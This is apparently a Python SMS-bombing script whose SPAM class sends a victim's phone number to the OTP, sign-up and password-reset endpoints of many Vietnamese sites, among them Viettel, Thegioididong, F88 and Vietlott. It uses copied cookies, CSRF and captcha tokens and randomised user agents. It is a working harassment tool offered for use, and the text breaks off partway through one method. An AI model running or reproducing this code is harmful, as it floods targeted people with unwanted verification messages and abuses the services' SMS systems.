import aiohttp
import asyncio
import os
import sys
import threading
import time
import json
import random
from fake_useragent import UserAgent
ua = UserAgent()
uua = ua.random


class SPAM:
    def __init__(self):
        self.sdt = ''
    
            
    async def oldloship(self):
        async with aiohttp.ClientSession() as session:
            payload = {
                "device": "Android 8.1.0",
                "platform": "Chrome/104.0.0.0",
                "countryCode": "84",
                "phoneNumber": self.sdt[1:11]
            }
            headers = {
                "Host": "mocha.lozi.vn",
                "content-length": "47",
                "x-city-id": "50",
                "accept-language": "vi_VN",
                "sec-ch-ua-mobile": "?1",
                "user-agent": uua,
                "content-type": "application/json",
                "x-lozi-client": "1",
                "x-access-token": "unknown",
                "sec-ch-ua-platform": "\"Android\"",
                "accept": "*/*",
                "origin": "https://loship.vn",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://loship.vn",
                "accept-encoding": "gzip, deflate, br"
            }
            async with session.post("https://mocha.lozi.vn/v6/invites/use-app", headers=headers, data=json.dumps(payload)) as response:
                if response.status == 200:
                    print("$", "LOSHIP: THÀNH CÔNG")
                else:
                    print("$", "LOSHIP: THẤT BẠI")

    async def nh247(self):
        async with aiohttp.ClientSession() as session:
            cookies = {
                '_csrf': '973eca1396514e55d251748b39039603b1974232a85e242bfc08063f1c789d2fa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22IKtajFXbRCbbHEdh_tLbQ4g1lmiP07IS%22%3B%7D',
                '_gcl_au': '1.1.1635282769.1685511240',
                '_gid': 'GA1.2.147827434.1685511243',
                '_gac_UA-53976512-2': '1.1685511243.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
                '_gat_gtag_UA_53976512_2': '1',
                '_dc_gtm_UA-53976512-2': '1',
                'vid': '1468653',
                '_gcl_aw': 'GCL.1685511244.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
                '_ga': 'GA1.1.1662212097.1685511243',
                'amp_6e403e': 'jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1o4p61l.1h1o4pa8v.0.2.2',
                '_ga_D022K7SJPP': 'GS1.1.1685511244.1.1.1685511263.41.0.0',
            }

            headers = {
                'authority': 'www.nhaphang247.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'dnt': '1',
                'origin': 'https://www.nhaphang247.com',
                'referer': 'https://www.nhaphang247.com/huong-dan-dat-hang?utm_source=google&utm_medium=keywords&utm_campaign=adwords&gclid=CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
                'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': uua,
                'x-csrf-token': 'ZDR1dGxJa2stfwEVBg8zCTZ3FxYkDA8DO0A5Fj19DFoIWRwkXH4iOA==',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'phone': self.sdt,
                'token': '03AL8dmw-olofZxzuAeuXxDdXsmyMgy6BfZMVUHf7xK_ldn11WRQ_Ni75LkYaBB2vD6rLahRgFlLdMPgGotfuclQC9lLta0nvH0h6u6LEW6HPHU5OnCPJ04S-LVh0aPxwVHlWrJOxmNdUT6P0k1R5yWtjRvp3s60NX0RZSZKFDbXYnr766alQsbLv17M_942ilwyQkv8tBP00HCjU41Hwm8oXlUYqIdVCrw7sHASCV5rlFJ0HksjIY6UX9KpFLNQfL7qmF5fTge43suFmWRhLRrKqOPTT3HwClFqSlvxn09LONUr6ntGuI82aB2okl0J18FBmhWqDZpHlhLgfLyxRq7l0Cd09GbaAZ8-RfQJ2Dc2BpLJkmCupzA-xDM_dtKicThuzA8-2Rg5FyvnSESGMtBnklPAsKfdOZTjJ4HQWhmwCBUqksS8wQuKXsGxNTnZM4LwF5eS08pp6rJFEsPMhYUgpNuKMc0il9L7Ue0bbBLvEjhusIq62MGv3TZTmpvAklikuiXrquHXYCcOb7tBqYdvTPNsR3iNWmi5y7vEsgBfY5SrZ_2R_Bq4nviqDRuB4G2jV8_9DUxp0x',
            }

            async with session.post('https://www.nhaphang247.com/site/get-code', cookies=cookies, headers=headers, data=data) as response:
                if response.status == 200:
                    print("$", "NH247: Thanh cong")
                else:
                    print("$", "NH247: That bai")

    async def tgdd(self):
        try:
            async with aiohttp.ClientSession() as session:
                cookies = {
                    '_fbp': 'fb.1.1679232009409.808358055',
                    '_tt_enable_cookie': '1',
                    '_ttp': 'ik3XoEfe1G5qpUvJxSkt6x_ov2X',
                    '_gid': 'GA1.2.363981176.1685511071',
                    '_gat_UA-918185-25': '1',
                    'cebs': '1',
                    '_ce.s': 'v~89793a8029c5d443715079fd76d2762fb41df2f1~vpv~3~lcw~1685361221737~lcw~1685511071374',
                    '_ce.clock_event': '1',
                    '_ce.clock_data': '-446%2C104.28.222.73%2C1',
                    'DMX_Personal': '%7B%22UID%22%3A%22d6858c724ac91441fcd713e63758af60b71dbc5f%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
                    '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8OWsBjKS6DlGsrtmU_sYztJuGkytAYdP-vIR5P0El_r00zniRA9cccmCDB92sMlpADsFP2HW8dF6TDZiwyL6sLBr6CLgxRf7wvyc7OYXUDalCYANMSg0nOaidDGIO0f2m310EwBskc8tzTy2Ss9Cm0I',
                    '_gat': '1',
                    'amp_6e403e': 'jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1o4k20c.1h1o4k20h.0.7.7',
                    'lhc_per': 'vid|42ed9e755b395839eba6',
                    'SvID': 'beline173|ZHbbr|ZHbbn',
                    '_ga_TLRZMSX5ME': 'GS1.1.1685511070.8.1.1685511081.49.0.0',
                    '_ga': 'GA1.1.1756884604.1679232009',
                    'cebsp_': '4',
                }

                headers = {
                    'authority': 'www.thegioididong.com',
                    'accept': '*/*',
                    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'dnt': '1',
                    'origin': 'https://www.thegioididong.com',
                    'referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
                    'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': uua,
                    'x-requested-with': 'XMLHttpRequest',
                }

                data = {
                    'phoneNumber': self.sdt,
                    'isReSend': 'false',
                    'sendOTPType': '1',
                    '__RequestVerificationToken': 'CfDJ8OWsBjKS6DlGsrtmU_sYztLpTcob9E0bxuobYVB8dQFaL0WLcVzR9YiMuozma1o6enh4tyv4srMkrU7uJwojfJ9s_8HEvT_0Z1sEf-UnWZWlSNXCEqToMluu-q6_gMQjmSzUsEbpXmX-wvTDUopOIqA',
                }

                async with session.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
                                        cookies=cookies,
                                        headers=headers,
                                        data=data) as response:
                    if response.status == 200:
                        print("$", "TGDD: Thanh cong")
                    else:
                        print("$", "TGDD: That bai")
        except:
            print("lỗi")

    async def y360(self):
        try:
            async with aiohttp.ClientSession() as session:
                cookies = {
                    '_gcl_au': '1.1.1985930927.1685500253',
                    '_gid': 'GA1.2.326096694.1685500253',
                    'amp_6e403e': 'jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1nq9n9d.1h1nq9n9h.0.1.1',
                    '_gat_gtag_UA_211029013_1': '1',
                    '_ga_M7ZN50PQ1V': 'GS1.1.1685506950.2.0.1685506950.0.0.0',
                    '_ga': 'GA1.1.671767767.1685500253',
                    '_ga_BS2V9QEV6V': 'GS1.1.1685506950.2.0.1685506950.0.0.0',
                }

                headers = {
                    'authority': 'y360.vn',
                    'accept': 'application/json',
                    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://y360.vn',
                    'referer': 'https://y360.vn/hoc/register',
                    'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': uua,
                }

                json_data = {
                    'phone': self.sdt,
                }

                async with session.post('https://y360.vn/api/v1/user/register',
                                        cookies=cookies,
                                        headers=headers,
                                        json=json_data) as response:
                    if response.status == 200:
                        print("$", "Y360: Thanh cong")
                    else:
                        print("$", "Y360: That bai")
        except:
            print("lỗi")

    async def oldtamo(self):
        async with aiohttp.ClientSession() as session:
            headers = {
                "Host": "api.tamo.vn",
                "content-length": "39",
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json;charset=UTF-8",
                "sec-ch-ua-mobile": "?1",
                "user-agent": uua,
                "sec-ch-ua-platform": "\"Linux\"",
                "origin": "https://www.tamo.vn",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.tamo.vn/",
                "accept-encoding": "gzip, deflate, br"
            }
            data = {
                "mobilePhone": {
                    "number": self.sdt
                }
            }
            async with session.post("https://api.tamo.vn/web/public/clienton/phe/sms-code-ts", headers=headers, json=data) as response:
                if response.status == 200:
                    print("$", "TAMO: THÀNH CÔNG")
                else:
                    print("$", "TAMO: THẤT BẠI")
    

    async def vayvnd(self):
        cookies = {
            '_gcl_au': '1.1.1234341675.1686922968',
            '_gid': 'GA1.2.206707874.1686922968',
            '_tt_enable_cookie': '1',
            '_ttp': 'WyNAskSGc-MRWecC-x4AoVux6yP',
            '_ym_uid': '1686922982967271010',
            '_ym_d': '1686922982',
            '_ym_isad': '1',
            '_gat_UA-151110385-1': '1',
            '_ga_P2783EHVX2': 'GS1.1.1686970390.2.0.1686970390.60.0.0',
            '_ga': 'GA1.1.1535606375.1686922968',
            '_ym_visorc': 'b',
        }

        headers = {
            'authority': 'api.vayvnd.vn',
            'accept': 'application/json',
            'accept-language': 'vi-VN',
            'content-type': 'application/json; charset=utf-8',
            # 'cookie': '_gcl_au=1.1.1234341675.1686922968; _gid=GA1.2.206707874.1686922968; _tt_enable_cookie=1; _ttp=WyNAskSGc-MRWecC-x4AoVux6yP; _ym_uid=1686922982967271010; _ym_d=1686922982; _ym_isad=1; _gat_UA-151110385-1=1; _ga_P2783EHVX2=GS1.1.1686970390.2.0.1686970390.60.0.0; _ga=GA1.1.1535606375.1686922968; _ym_visorc=b',
            'dnt': '1',
            'origin': 'https://vayvnd.vn',
            'referer': 'https://vayvnd.vn/',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'site-id': '3',
            'user-agent': uua,
        }

        json_data = {
            'phone': self.sdt,
            'utm': [
                {
                    'utm_source': 'google',
                    'utm_medium': 'organic',
                    'referrer': 'https://www.google.com/',
                },
            ],
            'sourceSite': 3,
        }

        async with aiohttp.ClientSession() as session:
            async with session.post('https://api.vayvnd.vn/v2/users', cookies=cookies, headers=headers, json=json_data) as response:
                if 'true' in await response.text():
                    print("$", "VAYVND Thanh cong")
                else:
                    print("$", "VAYVND That bai")

    async def nhac(self):
        cookies = {
            'JSESSIONID': 'NODE011vzelbsqjuk2xfkvaaxksumda18615.NODE01',
            '_ga': 'GA1.2.894667319.1686970641',
            '_gid': 'GA1.2.227690365.1686970641',
            '_gat': '1',
            '_ga_3PYR5EWEF4': 'GS1.2.1686970640.1.0.1686970640.60.0.0',
        }

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            # 'Cookie': 'JSESSIONID=NODE011vzelbsqjuk2xfkvaaxksumda18615.NODE01; _ga=GA1.2.894667319.1686970641; _gid=GA1.2.227690365.1686970641; _gat=1; _ga_3PYR5EWEF4=GS1.2.1686970640.1.0.1686970640.60.0.0',
            'DNT': '1',
            'Origin': 'http://funring.vn',
            'Referer': 'http://funring.vn/',
            'User-Agent': uua,
        }

        json_data = {
            'username': self.sdt,
        }

        async with aiohttp.ClientSession() as session:
            async with session.post('http://funring.vn/api/v1.0.1/jersey/user/getotp', cookies=cookies, headers=headers, json=json_data, verify_ssl=False) as response:
                if 'true' in await response.text():
                    print("$", "VAYVND Thanh cong")
                else:
                    print("$", "VAYVND That bai")

    async def call1(self):
        cookies = {
            'XSRF-TOKEN': 'eyJpdiI6Ii9mdjJSV002YjRDT1hZWDdRSHNUWHc9PSIsInZhbHVlIjoiVVZxSFkyaFE5VGtBR0JjNkloMGd4aXU4bGFITlJnbm16ckNTTDlQYUdVK3RjbjdPYjZ5MzY5NmpaWEY4S3RwVEJsZERSbnIxemVHWUZydWlkdjcydjQvTmRUUWdyc2xFYk1UYjdkc2ZlSmJDcGs5eHl5a3RscTVFZWx1ZFN1YWMiLCJtYWMiOiIwYjc2YjA3ZDY5ZWQ0ZWJmZWIwODYwN2M1MWFmOGM3MDRhY2E4NDcxOGQwZWQxNDU5Y2ZkNzAwMmQ0N2Q0ZjM0IiwidGFnIjoiIn0=',
            'cozmomoney_session': 'Me8LkF4RsWuRNxmQvLGopUKwC0fc0KNmMHxxFpsH',
            'data': '7e8c86cc83159b402d8fcc02f42967bb',
            '_gcl_au': '1.1.1444455108.1686973495',
            '_ga': 'GA1.1.1623784125.1686973497',
            '_ym_uid': '1686973498713797001',
            '_ym_d': '1686973498',
            '_ym_isad': '1',
            '_clck': 'cijrx4|2|fcj|0|1263',
            '_ym_visorc': 'w',
            '_hjSessionUser_3309000': 'eyJpZCI6IjA5ZDlmNzRmLTNlMzQtNTUwNi1hMTY1LWMzOTM1NzI3OTc2YSIsImNyZWF0ZWQiOjE2ODY5NzM0OTg4MjcsImV4aXN0aW5nIjpmYWxzZX0=',
            '_hjFirstSeen': '1',
            '_hjIncludedInSessionSample_3309000': '0',
            '_hjSession_3309000': 'eyJpZCI6ImE0MDBiMDQ1LTdkZjAtNDRiZC1iNDhlLWJiODhjNzZkZjliMiIsImNyZWF0ZWQiOjE2ODY5NzM0OTg4NDcsImluU2FtcGxlIjpmYWxzZX0=',
            '_clsk': 't9zdqf|1686973499651|1|1|v.clarity.ms/collect',
            '_ga_BN3G2QNZ4H': 'GS1.1.1686973496.1.1.1686973526.0.0.0',
        }

        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'DNT': '1',
            'Origin': 'https://cozmo.vn',
            'Referer': 'https://cozmo.vn/?clickid=bnRMjMAPT6BF4LlPgEHrVBmDyGLXjRrNeqtfFufaWcXHGpqw&utm_campaign=cpl&utm_medium=affiliate&utm_source=accesstrade&utm_content=932508&atnct1=3812f9a59b634c2a9c574610eaba5bed&atnct2=bnRMjMAPT6BF4LlPgEHrVBmDyGLXjRrNeqtfFufaWcXHGpqw&atnct3=l4p8m000cw000jzj0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'X-XSRF-TOKEN': 'eyJpdiI6Ii9mdjJSV002YjRDT1hZWDdRSHNUWHc9PSIsInZhbHVlIjoiVVZxSFkyaFE5VGtBR0JjNkloMGd4aXU4bGFITlJnbm16ckNTTDlQYUdVK3RjbjdPYjZ5MzY5NmpaWEY4S3RwVEJsZERSbnIxemVHWUZydWlkdjcydjQvTmRUUWdyc2xFYk1UYjdkc2ZlSmJDcGs5eHl5a3RscTVFZWx1ZFN1YWMiLCJtYWMiOiIwYjc2YjA3ZDY5ZWQ0ZWJmZWIwODYwN2M1MWFmOGM3MDRhY2E4NDcxOGQwZWQxNDU5Y2ZkNzAwMmQ0N2Q0ZjM0IiwidGFnIjoiIn0=',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        json_data = {
            'lead_id': '743b8b9b-b34a-4d9c-9f65-53ccb5e866c7',
            'session_id': 'ae1e4a30-0218-4f7e-a74d-560dba744b94',
            'uuid': '5138FF9F-AEC0-4DC3-85A6-3B1A81133CC5',
            'action_name': 'FullNamePageSuccess',
            'action_data': '{"timestamp":1686973540378}',
            'mobile': self.sdt,
        }

        async with aiohttp.ClientSession() as session:
            async with session.post('https://cozmo.vn/api/track-user', cookies=cookies, headers=headers, json=json_data) as response:
                if 'true' in await response.text():
                    print("$", "VAYVND Thanh cong")
                else:
                    print("$", "VAYVND That bai")

    async def credit(self):
        def random_string(length):
            characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            result = ""
            for _ in range(length):
                result += random.choice(characters)
            return result

        mail = random_string(6) + '@gmail.com'

        cookies = {
            'SN5c8116d5e6183': 'v99vi2kqrucfnianqssab2tr76',
            'OnCredit_id': '648e59fda25e21.60289044',
            '_gid': 'GA1.2.978271845.1687050752',
            'GN_USER_ID_KEY': '295a08c0-d334-438d-b15d-35d187e0efa9',
            'GN_SESSION_ID_KEY': '40249a58-4171-4c4b-b40d-214b841c2819',
            'gravitecOptInBlocked': 'true',
            '_ga': 'GA1.1.945615990.1687050752',
            'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': 'qWfJAKAq4c4ikN6z0uN/tiJWLmFKjnkL7ZKOzUXEVyE=',
            '_ga_462Z3ZX24C': 'GS1.1.1687050752.1.1.1687050994.60.0.0',
        }

        headers = {
            'authority': 'oncredit.vn',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'dnt': '1',
            'origin': 'https://oncredit.vn',
            'referer': 'https://oncredit.vn/registration',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': uua,
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'data[typeData]': 'sendCodeReg',
            'data[phone]': self.sdt,
            'data[email]': mail,
            'data[captcha1]': '1',
            'data[lang]': 'vi',
            'CSRFName': 'CSRFGuard_ajax',
            'CSRFToken': 'sfA3GGfAn9f6Rd52ry3Qzr9FEH655Gz48R4Arke2Y2ZN6GHQEnHrKeRH8kfb4ZSA',
        }

        async with aiohttp.ClientSession() as session:
            async with session.post('https://oncredit.vn/?ajax', cookies=cookies, headers=headers, data=data) as response:
                if 'OK' in await response.text():
                    print("$", "CREDIT Thanh cong")
                else:
                    print("$", "CREDIT That bai")

    async def vayvnd(self):
        cookies = {
            '_gcl_au': '1.1.1234341675.1686922968',
            '_gid': 'GA1.2.206707874.1686922968',
            '_tt_enable_cookie': '1',
            '_ttp': 'WyNAskSGc-MRWecC-x4AoVux6yP',
            '_ym_uid': '1686922982967271010',
            '_ym_d': '1686922982',
            '_ga_P2783EHVX2': 'GS1.1.1687052163.3.0.1687052163.60.0.0',
            '_ga': 'GA1.1.1535606375.1686922968',
            '_ym_isad': '1',
            '_ym_visorc': 'b',
        }

        headers = {
            'authority': 'api.vayvnd.vn',
            'accept': 'application/json',
            'accept-language': 'vi-VN',
            'content-type': 'application/json; charset=utf-8',
            'dnt': '1',
            'origin': 'https://vayvnd.vn',
            'referer': 'https://vayvnd.vn/',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'site-id': '3',
            'user-agent': uua,
        }

        json_data = {
            'login': self.sdt,
        }

        async with aiohttp.ClientSession() as session:
            async with session.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data) as response:
                if 'true' in await response.text():
                    print("$", "VAYVND Thanh cong")
                else:
                    print("$$", "VAYVND That bai")

    async def f88(self):
        headers = {
            'Host': 'api.f88.vn',
            'accept': 'application/json, text/plain, */*',
            'content-encoding': 'gzip',
            'user-agent': uua,
            'content-type': 'application/json',
            'origin': 'https://online.f88.vn',
            'referer': 'https://online.f88.vn/',
        }
        data = {
            'phoneNumber': self.sdt,
            'recaptchaResponse': '03AFY_a8WJNsx5MK3zLtXhUWB0Jlnw7pcWRzw8R3OhpEx5hu3Shb7ZMIfYg0H2X24378jj2NFtndyzGFF_xjjZ6bbq3obns9JlajYsIz3c1SESCbo05CtzmP_qgawAgOh495zOgNV2LKr0ivV_tnRpikGKZoMlcR5_3bks0HJ4X_R6KgdcpYYFG8cUZRSxSamyRPkC2yjoFNpTeCJ2Q6-0uDTSEBjYU5T3kj8oM8rAAR6BnBVVD7GMz0Ol2OjsmmXO4PtOwR8yipYdwBnL2p8rC8cwbPJ-Q6P1mTmzHkxZwZWcKovlpEGUvt2LfByYwXDMmx7aoI6QMTitY64dDVDdQSWQfyXC1jFg200o5TBFnTY0_0Yik31Y33zCM_r24HQ56KRMuew2LazF8u_30vyWN1tigdvPddOOPjWGjh2cl87l2cF57lCvoRTtOm-RRxyy5l0eq4dgsu2oy1khwawzzP5aE9c2rgcdDVMojZOUpamqhbKtsExad31Brilwf7BSVvu-JT33HtHO',
            'source': 'Online'
        }
        async with aiohttp.ClientSession() as session:
            async with session.post('https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP', json=data, headers=headers) as response:
                access = await response.json()
                print("$", "F88 Thanh cong")

    async def viettel(self):
        headers = {
            'Host': 'vietteltelecom.vn',
            'Connection': 'keep-alive',
            'X-CSRF-TOKEN': 'mXy4RvYExDOIR62HlNUuGjVUhnpKgMA57LhtHQ5I',
            'User-Agent': uua,
            'Content-Type': 'application/json;charset=UTF-8',
            'Accept': 'application/json, text/plain, */*',
            'Referer': 'https://vietteltelecom.vn/dang-nhap',
        }
        data = {
            'phone': self.sdt,
            'type': ''
        }
        async with aiohttp.ClientSession() as session:
            async with session.post('https://vietteltelecom.vn/api/get-otp-login', json=data, headers=headers) as response:
                result = await response.json()
                print("$", "Viettel Thanh cong")

    async def viettel2(self):
        headers = {
            'Host': 'viettel.vn',
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/plain, */*',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': uua,
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://viettel.vn',
        }
        async with aiohttp.ClientSession() as session:
            async with session.get('https://viettel.vn/dang-ky', headers=headers) as response:
                token = await response.text()
                token = token.split(
                    'name="csrf-token" content="')[1].split('"')[0]

        headers = {
            'Host': 'viettel.vn',
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/plain, */*',
            'X-XSRF-TOKEN': token,
            'X-CSRF-TOKEN': token,
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://viettel.vn',
            'Referer': 'https://viettel.vn/dang-nhap',
        }
        data = {
            'msisdn': self.sdt
        }
        async with aiohttp.ClientSession() as session:
            async with session.post('https://viettel.vn/api/get-otp', json=data, headers=headers) as response:
                result = await response.json()
                print("$", "Viettel Thanh cong")

    async def swift247(self):
        url = "https://api.swift247.vn/v1/check_phone"
        headers = {
            "Host": "api.swift247.vn",
            "content-length": "23",
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "user-agent": uua,
            "sec-ch-ua-platform": "\"Android\"",
            "origin": "https://app.swift247.vn",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://app.swift247.vn/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
        }
        post_data = {"phone": "84" + self.sdt[1:11]}

        async with aiohttp.ClientSession() as session:
            async with session.post(url, headers=headers, data=json.dumps(post_data)) as response:
                response_data = await response.json()

                if "OTP_NO_CONFIRMED" in response_data:
                    url = "https://api.swift247.vn/v1/request_new_otp"
                    await session.post(url, headers=headers, data=json.dumps(post_data))

                if "200" in response_data:
                    print("$", "SWIFT247 Thanh cong")
                else:
                    print("$", "SWIFT247 That bai")

    async def phuclong(self):
        headers = {
            "Host": "api-crownx.winmart.vn",
            "content-length": "126",
            "accept": "application/json",
            "content-type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "authorization": "Bearer undefined",
            "user-agent": uua,
            "sec-ch-ua-platform": "\"Android\"",
            "origin": "https://order.phuclong.com.vn",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://order.phuclong.com.vn/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
        }

        data = {
            "phoneNumber": self.sdt,
            "fullName": "Le Văn Sang",
            "email": 'hahaha@gmail.com',
            "password": "Vrxx#1337"
        }

        async with aiohttp.ClientSession() as session:
            async with session.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', headers=headers, json=data) as response:
                if "true" in await response.text():
                    print("$", "PHUCLONG Thanh cong")
                else:
                    print("$", "PHUCLONG That bai")

    async def vietlott(self):
        headers = {
            "Host": "api-mobi.vietlottsms.vn",
            "Connection": "keep-alive",
            "Content-Length": "28",
            "ClientCallAPI": "EMB",
            "deviceId": "",
            "sec-ch-ua-mobile": "?1",
            "User-Agent": uua,
            "Content-Type": "application/json",
            "Accept": "*/*",
            "partnerChannel": "WEB",
            "Identify-Device-Token": "",
            "checkSum": "887e5218c679e1fe26b48cc642532a39909f619868f09d415b7d13cd43784f36",
            "sec-ch-ua-platform": "\"Android\"",
            "Origin": "https://vietlott-sms.vn",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://vietlott-sms.vn/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
        }

        data = {
            "phoneNumber": self.sdt
        }

        async with aiohttp.ClientSession() as session:
            async with session.post('https://api-mobi.vietlottsms.vn/mobile-api/register/registerWithPhoneNumber', headers=headers, json=data) as response:
                if 'true' in await response.text():
                    print("$", "VIETLOTT Thanh cong")
                else:
                    print("$", "VIETLOTT That bai")

    async def vamo(self):
        headers = {
            "Host": "vamo.vn",
            "Content-Length": "24",
            "sec-ch-ua": "\"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "User-Agent": uua,
            "sec-ch-ua-platform": "\"Android\"",
            "Origin": "https://vamo.vn",
